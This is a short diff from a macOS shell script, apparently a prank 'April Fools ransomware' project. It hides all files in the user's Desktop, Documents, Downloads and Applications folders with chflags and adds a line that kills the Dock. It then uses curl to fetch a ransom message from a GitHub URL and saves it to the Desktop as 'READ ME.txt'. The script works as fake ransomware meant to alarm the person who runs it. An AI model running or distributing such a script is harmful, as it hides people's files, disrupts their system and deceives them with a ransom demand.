@@ -7,4 +7,5 @@ chflags hidden ~/Desktop/*
 chflags hidden ~/Documents/*
 chflags hidden ~/Downloads/*
 chflags hidden /Applications/*
+killall Dock
 curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/ransommessage.txt" -o ~/Desktop/READ\ ME.txt
